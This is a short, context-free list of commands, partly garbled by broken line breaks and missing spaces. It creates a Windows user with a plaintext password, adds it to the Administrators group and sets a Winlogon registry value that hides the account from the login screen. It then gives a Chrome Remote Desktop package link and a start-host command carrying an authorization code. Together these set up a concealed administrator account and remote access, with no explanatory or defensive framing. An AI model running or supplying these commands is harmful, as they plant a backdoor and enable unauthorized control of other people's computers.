net user Aminshahdi @Gddrgddgg0070 /add

net localgroup Administrators Aminshahdi/add

reg add

"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"

/v Aminshahdi/t REG

DWORD /d

0/f


https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb



DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AdLIrYc5M1Hpz_gMNBfLuR1Sm54pn5qi8Lee9aDajn-SFIXbFUTftXdYwLTqqiWdDarf1w" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)
